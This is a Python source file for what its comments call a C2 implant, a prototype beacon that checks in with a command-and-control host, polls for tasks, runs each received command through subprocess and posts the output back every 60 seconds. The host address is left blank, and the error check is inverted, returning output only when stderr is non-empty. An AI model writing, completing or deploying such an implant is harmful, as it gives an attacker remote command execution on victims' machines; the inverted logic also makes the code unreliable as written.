#!/usr/bin/python3

from os import error
import requests
import subprocess
import time
import json

def handle_command(cmd):
    """Takes a list of strings as argument and tries to run the command"""
    out = subprocess.run(cmd, text=True, capture_output=True)
    
    if out.stderr != "": # if no error
        return out.stdout
    else:
        return "[-] Error: " + out.stderr

def main():
    creation = time.time_ns()
    new = True
    host = ""
    init_check_in = {} # maybe have a pre-defined set of things to send to the C2 upon execution of implant
    data = None # could be a dict or byte object according requests.post() docs


    while True:
        if new:
            resp = requests.get(host, init_check_in)
            # maybe there will be some additional stuff here after initial checkin
            if resp.status_code == 200:
                new = False
            time.sleep(60)
        else:
            if data != None: # if data is not None, then we are returning output from a command
                resp = requests.post(host, data)
                if resp.status_code == 200:
                    print("[+] Successfully sent data. Checking back in 60 seconds for new task")
                    data = None
                else:
                    print("[-] There was an error. Will try again in 60 seconds")
                time.sleep(60)
            else: # if data is None, then we should check in for a new task
                print("[+] Checking into host for any tasks")
                resp = requests.get(host)
                if resp.status_code == 200:
                    print("[+] Received new task -- working....")
                    data = dict(ns="")
                    command = resp.json()['cmd'] # cmd will be a key with a list of strings as the value
                                                 # will need to properly parse the command and args server-side
                                                 # before sending to implant 
                    data['ns'] = handle_command(command)
                    print(f"[+] Here is the output: {data['ns']}")
                else:
                    print("[-] Something happened -- Will try again in 60 seconds")
                time.sleep(60)